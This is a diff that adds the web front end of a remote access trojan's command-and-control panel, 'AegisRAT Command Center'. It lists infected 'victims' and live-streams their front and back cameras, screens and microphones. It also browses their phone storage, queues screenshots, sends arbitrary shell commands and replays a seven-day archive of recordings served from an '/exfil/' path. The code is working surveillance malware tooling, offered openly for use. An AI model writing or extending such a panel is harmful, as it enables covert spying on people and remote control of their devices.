@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AegisRAT Command Center</title>
+    <style>
+        :root {
+            --bg-color: #121212;
+            --panel-bg: #1e1e1e;
+            --text-color: #e0e0e0;
+            --accent-color: #00ff9d;
+            --danger-color: #ff4d4d;
+            --border-color: #333;
+            --input-bg: #2c2c2c;
+        }
+        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        header { background-color: var(--panel-bg); padding: 15px 20px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; }
+        h1 { margin: 0; color: var(--accent-color); font-size: 20px; }
+        .main-container { display: flex; flex: 1; overflow: hidden; }
+        
+        /* Sidebar */
+        .sidebar { width: 320px; background-color: var(--panel-bg); border-right: 1px solid var(--border-color); display: flex; flex-direction: column; }
+        .sidebar-header { padding: 15px; border-bottom: 1px solid var(--border-color); font-weight: bold; font-size: 14px; text-transform: uppercase; color: #888; }
+        .victim-list { flex: 1; overflow-y: auto; }
+        .victim-card { padding: 15px; border-bottom: 1px solid var(--border-color); cursor: pointer; transition: background-color 0.2s; }
+        .victim-card:hover { background-color: #2a2a2a; }
+        .victim-card.active { background-color: #2a2a2a; border-left: 4px solid var(--accent-color); }
+        .victim-name { font-weight: bold; font-size: 16px; color: var(--accent-color); margin-bottom: 5px; }
+        .victim-details { font-size: 12px; color: #aaa; display: flex; justify-content: space-between; }
+
+        /* Workspace */
+        .workspace { flex: 1; display: flex; flex-direction: column; padding: 20px; gap: 20px; overflow-y: auto; }
+        .workspace-header { display: flex; justify-content: space-between; align-items: center; background-color: var(--panel-bg); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); }
+        .stream-grid { display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; gap: 20px; flex: 1; min-height: 400px; }
+        .stream-box { background-color: var(--panel-bg); border: 1px solid var(--border-color); border-radius: 8px; display: flex; flex-direction: column; position: relative; overflow: hidden; }
+        .stream-header { padding: 10px 15px; background-color: #252525; border-bottom: 1px solid var(--border-color); font-size: 12px; font-weight: bold; color: #ccc; }
+        .stream-content { flex: 1; background-color: #000; display: flex; align-items: center; justify-content: center; color: #555; }
+        
+        /* Storage */
+        .storage-toolbar { display: flex; gap: 10px; padding: 10px; background-color: #252525; }
+        .storage-input { flex: 1; background-color: var(--input-bg); border: 1px solid var(--border-color); color: white; padding: 8px; }
+        .storage-list { flex: 1; overflow-y: auto; padding: 10px; }
+        .file-item { padding: 8px; cursor: pointer; font-size: 13px; border-radius: 4px; }
+        .file-item:hover { background-color: #333; }
+        
+        /* Footer */
+        .workspace-footer { display: flex; gap: 10px; background-color: var(--panel-bg); padding: 15px; border-radius: 8px; }
+        .action-btn { flex: 1; background-color: var(--input-bg); color: var(--text-color); border: 1px solid var(--border-color); padding: 10px; border-radius: 6px; cursor: pointer; }
+        .action-btn.primary { background-color: var(--accent-color); color: black; font-weight: bold; }
+                /* Video Styling for Multiplexing */
+        .stream-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.3s ease;
+        }
+                .mic-toggle {
+            background-color: var(--panel-bg);
+            color: var(--text-color);
+            border: 1px solid var(--border-color);
+            padding: 8px 16px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .mic-toggle.active {
+            background-color: var(--danger-color);
+            color: white;
+        }
+                /* Modal Styling */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 100;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+        }
+
+        .modal-content {
+            background-color: var(--panel-bg);
+            margin: 50px auto;
+            padding: 20px;
+            width: 80%;
+            max-width: 800px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .close-modal {
+            cursor: pointer;
+            font-size: 24px;
+            color: #aaa;
+        }
+
+        .archive-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px;
+            border-bottom: 1px solid var(--border-color);
+            cursor: pointer;
+        }
+
+        .archive-item:hover {
+            background-color: #333;
+        }
+                /* Add this to your CSS */
+        .stream-box.thumbnail-mode {
+            background-color: #111;
+        }
+        .stream-box.thumbnail-mode .stream-video {
+            transform: scale(0.5);
+            opacity: 0.8;
+        }
+        .stream-box.active-mode {
+            border-color: var(--accent-color) !important;
+            box-shadow: 0 0 15px var(--accent-color) !important;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>AEGIS RAT // COMMAND CENTER</h1>
+        <div id="victim-count">0 VICTIMS</div>
+    </header>
+
+    <div class="main-container">
+        <aside class="sidebar">
+            <div class="sidebar-header">Active Victims</div>
+            <div class="victim-list" id="victim-list">
+                <div style="padding: 20px; text-align: center; color: #666;">No victims online.</div>
+            </div>
+        </aside>
+
+        <main class="workspace" id="workspace" style="display: none;">
+            <div class="workspace-header">
+                <div class="victim-title" id="ws-victim-name">Victim Name</div>
+                <button class="mic-toggle" id="mic-toggle" onclick="toggleMic()">🎤 MIC: OFF</button>
+            </div>
+
+            <div class="stream-grid">
+                <!-- Box 1: Front Cam -->
+                <div class="stream-box" onclick="focusStream('front')" style="cursor: pointer;">
+                    <div class="stream-header">FRONT CAMERA</div>
+                    <div class="stream-content"><video id="front-video" class="stream-video" autoplay playsinline muted></video></div>
+                </div>
+                <!-- Box 2: Back Cam -->
+                <div class="stream-box" onclick="focusStream('back')" style="cursor: pointer;">
+                    <div class="stream-header">BACK CAMERA</div>
+                    <div class="stream-content"><video id="back-video" class="stream-video" autoplay playsinline muted></video></div>
+                </div>
+                
+                                <!-- Box 3: Screen -->
+                <div class="stream-box" onclick="focusStream('screen')" style="cursor: pointer;">
+                    <div class="stream-header">SCREEN MIRROR</div>
+                    <div class="stream-content"><video id="screen-video" class="stream-video" autoplay playsinline muted></video></div>
+                </div>
+                <!-- Box 4: Storage -->
+                <div class="stream-box">
+                    <div class="stream-header">STORAGE BROWSER</div>
+                    <div class="storage-toolbar">
+                        <input type="text" class="storage-input" id="storage-path" value="/sdcard">
+                        <button class="action-btn" onclick="refreshStorage()">🔄</button>
+                    </div>
+                    <div class="storage-list" id="storage-list">
+                        <div>Select a victim to browse.</div>
+                    </div>
+                </div>
+            </div>
+
+                <div class="workspace-footer">
+                <button class="action-btn" onclick="openArchive('front')">📼 FRONT ARCHIVE</button>
+                <button class="action-btn" onclick="openArchive('back')">📼 BACK ARCHIVE</button>
+                <button class="action-btn" onclick="takeSnapshot()">📸 SNAPSHOT</button>
+                <button class="action-btn primary" onclick="openConsole()">⌨️ OPEN CONSOLE</button>
+            </div>
+        </main>
+    </div>
+
+    <script>
+    const API_BASE = window.location.origin;
+    const TOKEN = "AEGIS_SECRET_TOKEN_123";
+    let selectedVictim = null;
+    let activeStream = 'front'; // Default active stream
+    let wsConnections = {};
+
+    function getHeaders() {
+        return { 'Content-Type': 'application/json', 'X-Aegis-Token': TOKEN };
+    }
+
+    // --- Victim Management ---
+    async function loadVictims() {
+        try {
+            const res = await fetch(`${API_BASE}/api/v1/admin/victims`, { headers: getHeaders() });
+            const victims = await res.json();
+            const list = document.getElementById('victim-list');
+            document.getElementById('victim-count').innerText = `${victims.length} VICTIMS`;
+            
+            if (victims.length === 0) {
+                list.innerHTML = '<div style="padding: 20px; text-align: center; color: #666;">No victims online.</div>';
+                return;
+            }
+
+            list.innerHTML = victims.map(v => `
+                <div class="victim-card ${selectedVictim === v.id ? 'active' : ''}" onclick="selectVictim('${v.id}')">
+                    <div class="victim-name">${v.alias || v.hostname}</div>
+                    <div class="victim-details">
+                        <span>${v.ip}</span>
+                        <span class="victim-battery">${v.battery_level || 0}%</span>
+                    </div>
+                </div>
+            `).join('');
+        } catch (e) { console.error(e); }
+    }
+
+    function selectVictim(id) {
+        if (selectedVictim === id) return; // Prevent re-selecting same victim
+        selectedVictim = id;
+        document.getElementById('workspace').style.display = 'flex';
+        document.getElementById('ws-victim-name').innerText = `VICTIM: ${id}`;
+        loadVictims(); // Update active state in sidebar
+        
+        // 1. Start Storage Browser
+        refreshStorage();
+        
+        // 2. Start ALL Streams Immediately
+        initStreams();
+    }
+
+    // --- Streaming Logic (Instant Live) ---
+    function initStreams() {
+        // Close any existing connections
+        Object.values(wsConnections).forEach(ws => {
+            if (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING) {
+                ws.close();
+            }
+        });
+        wsConnections = {};
+
+        // Open connections for all 4 channels immediately
+        ['front', 'back', 'screen', 'mic'].forEach(type => {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${protocol}//${window.location.host}/stream/${type}_cam?victim_id=${selectedVictim}`;
+            const ws = new WebSocket(wsUrl);
+            
+            ws.onopen = () => {
+                console.log(`[MUX] ${type} stream connected`);
+                
+                // Only send initial state for video streams
+                if (type !== 'mic') {
+                    const initialState = (type === activeStream) ? 'active' : 'thumbnail';
+                    ws.send(JSON.stringify({ type: 'set_state', state: initialState }));
+                    
+                    // Highlight the active video stream
+                    if (type === activeStream) {
+                        highlightStream(type, true);
+                    }
+                }
+            };
+            ws.onmessage = (event) => {
+                // Handle binary video data (MSE) or JSON state updates
+                if (event.data instanceof Blob) {
+                    // Binary frame received -> Feed to MediaSource (MSE)
+                    // For this scaffold, we just log that data is flowing
+                    // console.log(`[STREAM] ${type} received binary frame`);
+                } else {
+                    const data = JSON.parse(event.data);
+                    if (data.type === 'state_update') {
+                        // Update UI if the C2 server changes the state
+                        highlightStream(data.stream, data.state === 'active');
+                    }
+                }
+            };
+            
+            ws.onclose = () => {
+                console.log(`[MUX] ${type} stream closed`);
+            };
+
+            wsConnections[type] = ws;
+        });
+    }
+
+          function highlightStream(type, isActive) {
+        if (type !== 'front' && type !== 'back' && type !== 'screen') return;
+
+        const box = document.querySelector(`.stream-box:has(#${type}-video)`);
+        if (!box) return;
+
+        if (isActive) {
+            box.classList.add('active-mode');
+            box.classList.remove('thumbnail-mode');
+            const video = box.querySelector('video');
+            if (video) video.style.transform = 'scale(1)';
+            activeStream = type;
+        } else {
+            box.classList.remove('active-mode');
+            box.classList.add('thumbnail-mode');
+            const video = box.querySelector('video');
+            if (video) video.style.transform = 'scale(0.5)';
+        }
+    }
+
+    // --- Interaction: Click to Focus ---
+    function focusStream(type) {
+        if (!selectedVictim) return;
+        
+        // Tell the C2 Server to make this stream 'active'
+        fetch(`${API_BASE}/api/v1/streams/state`, {
+            method: 'POST',
+            headers: getHeaders(),
+            body: JSON.stringify({
+                victim_id: selectedVictim,
+                stream_type: type,
+                state: 'active'
+            })
+        }).then(r => r.json()).then(res => {
+            // Locally update the UI immediately for responsiveness
+            ['front', 'back', 'screen', 'mic'].forEach(t => {
+                highlightStream(t, t === type);
+            });
+        });
+    }
+
+    function toggleMic() {
+        // Toggle mic state
+        const btn = document.getElementById('mic-toggle');
+        const isOn = btn.innerText.includes('ON');
+        btn.innerText = isOn ? '🎤 MIC: OFF' : '🎤 MIC: ON';
+        btn.classList.toggle('active', !isOn);
+        
+        if (selectedVictim) {
+            fetch(`${API_BASE}/api/v1/streams/state`, {
+                method: 'POST',
+                headers: getHeaders(),
+                body: JSON.stringify({
+                    victim_id: selectedVictim,
+                    stream_type: 'mic',
+                    state: isOn ? 'paused' : 'active'
+                })
+            });
+        }
+    }
+
+    // --- Storage Browser ---
+    async function refreshStorage() {
+        if (!selectedVictim) return;
+        const path = document.getElementById('storage-path').value;
+        const listDiv = document.getElementById('storage-list');
+        listDiv.innerHTML = 'Loading...';
+        
+        try {
+            const res = await fetch(`${API_BASE}/api/v1/storage/list?victim_id=${selectedVictim}&path=${encodeURIComponent(path)}`, { headers: getHeaders() });
+            const data = await res.json();
+            
+            if (data.error) {
+                listDiv.innerHTML = `<div style="color:red">${data.error}</div>`;
+                return;
+            }
+
+            listDiv.innerHTML = data.files.map(f => `
+                <div class="file-item" onclick="navigateTo('${f.path}')">
+                    ${f.is_dir ? '📁' : '📄'} ${f.name}
+                </div>
+            `).join('') || '<div>No files found.</div>';
+        } catch (e) {
+            listDiv.innerHTML = '<div style="color:red">Connection Error</div>';
+        }
+    }
+
+    function navigateTo(path) {
+        document.getElementById('storage-path').value = path;
+        refreshStorage();
+    }
+
+    // --- Actions ---
+    function takeSnapshot() {
+        if (!selectedVictim) return;
+        fetch(`${API_BASE}/api/v1/admin/queue`, {
+            method: 'POST',
+            headers: getHeaders(),
+            body: JSON.stringify({
+                victim_id: selectedVictim,
+                action: 'screenshot',
+                args: {}
+            })
+        }).then(r => r.json()).then(res => alert(`Snapshot Command Queued: ${res.id}`));
+    }
+
+    function openConsole() {
+        const cmd = prompt("Enter shell command (e.g., ls -la /sdcard):", "whoami");
+        if (cmd) {
+            fetch(`${API_BASE}/api/v1/admin/queue`, {
+                method: 'POST',
+                headers: getHeaders(),
+                body: JSON.stringify({
+                    victim_id: selectedVictim,
+                    action: 'execute',
+                    args: { script: cmd }
+                })
+            }).then(r => r.json()).then(res => alert(`Command Queued: ${res.id}`));
+        }
+    }
+
+    // --- Footer Actions ---
+    function openArchive(type) {
+        if (!selectedVictim) return;
+        fetch(`${API_BASE}/api/v1/admin/archive?victim_id=${selectedVictim}&stream_type=${type}`, {
+            headers: getHeaders()
+        }).then(r => r.json()).then(files => {
+            const modal = document.getElementById('archive-modal');
+            const title = document.getElementById('archive-title');
+            const list = document.getElementById('archive-list');
+            
+            title.innerText = `${type.toUpperCase()} ARCHIVE (7D)`;
+            list.innerHTML = files.map(f => `
+                <div class="archive-item">
+                    <span>📼 ${f}</span>
+                    <button class="action-btn" style="padding: 5px 10px; font-size: 12px;" onclick="playArchive('${type}', '${f}')">PLAY</button>
+                </div>
+            `).join('') || '<div>No archives found.</div>';
+            
+            modal.style.display = 'block';
+        });
+    }
+
+    function closeArchive() {
+        document.getElementById('archive-modal').style.display = 'none';
+    }
+
+    function playArchive(type, filename) {
+        // Open the MP4 in a new tab
+        const url = `${API_BASE}/exfil/${selectedVictim}/streams/${type}/${filename}`;
+        window.open(url, '_blank');
+    }
+
+    // Init
+    setInterval(loadVictims, 5000);
+    loadVictims();
+                
+</script>
+
+        <!-- Archive Modal -->
+    <div id="archive-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 id="archive-title">Archive</h2>
+                <span class="close-modal" onclick="closeArchive()">&times;</span>
+            </div>
+            <div id="archive-list">
+                <!-- Archive files will be injected here -->
+            </div>
+        </div>
+    </div>
+   
+</body>
+</html>
